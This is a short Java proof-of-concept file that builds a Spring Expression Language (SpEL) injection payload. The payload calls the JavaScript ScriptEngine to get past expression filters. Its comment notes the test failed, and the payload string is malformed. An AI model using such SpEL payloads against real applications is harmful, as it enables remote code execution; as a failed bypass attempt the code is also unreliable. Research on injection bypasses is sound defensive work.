package PoCAndBypass.NormalBypass;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

import javax.script.ScriptEngineManager;


// 调用 JavaScript Engine 来 bypass，测试失败
public class JavaScriptEngineBypass2 {
    public static void main(String[] args) {
        String spel = "T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(\"Calc\"),)";
        ExpressionParser parser = new SpelExpressionParser();
        Expression expression = parser.parseExpression(spel);
        System.out.println(expression.getValue());
    }
}
